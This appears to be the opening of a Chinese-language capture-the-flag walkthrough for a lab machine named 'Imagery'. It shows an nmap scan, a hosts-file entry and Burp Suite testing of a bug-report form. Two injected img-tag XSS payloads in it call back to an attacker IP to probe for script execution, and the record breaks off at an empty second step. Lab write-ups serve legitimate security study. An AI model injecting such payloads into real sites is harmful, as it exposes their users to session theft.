## Imagery
```
[★]$ nmap -sV -sC 10.129.242.164
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-27 00:27 CST
Nmap scan report for 10.129.242.164
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http-alt Werkzeug/3.1.3 Python/3.12.7
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
```
#### 在扫描的时候没有发现域名，打开网页8000端口可以找寻相关域名
```
[★]$ echo '10.129.242.164 imagery.htb' | sudo tee -a /etc/hosts
```
#### 注册登录后，点击地下的的Report Bug
#### burpsuite
#### [1]
```
"><img src="http://10.10.15.132/bug_name">

"><img src="http://10.10.15.132/bug_details">
```
#### [2]
```
